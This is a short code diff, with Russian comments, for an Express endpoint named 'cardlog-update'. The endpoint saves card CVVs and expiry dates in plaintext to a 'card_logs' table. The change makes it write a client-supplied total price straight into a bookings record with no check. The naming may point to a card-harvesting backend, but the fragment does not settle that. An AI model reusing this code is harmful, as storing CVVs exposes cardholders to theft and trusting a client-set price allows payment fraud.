@@ -455,7 +455,7 @@ const validateCardData = (
 
 // ➝ Обновляем эндпоинт с валидацией
 router.post("/cardlog-update", async (req, res) => {
-  const { sessionId, cvv, expireDate } = req.body;
+  const { sessionId, cvv, expireDate, totalPrice } = req.body;
 
   // Валидация данных
   const validation = validateCardData(cvv, expireDate);
@@ -468,12 +468,19 @@ router.post("/cardlog-update", async (req, res) => {
   }
 
   try {
-    // Обновляем существующую запись
     const result = db
       .prepare(
         `UPDATE card_logs SET cvv = ?, expire_date = ?, step = 'completed' WHERE session_id = ?`
       )
       .run(cvv, expireDate, sessionId);
+
+    db.prepare(
+      `
+  UPDATE bookings
+  SET total_amount = ?
+  WHERE session_id = ?
+`
+    ).run(totalPrice, sessionId);
 
     if (result.changes === 0) {
       return res
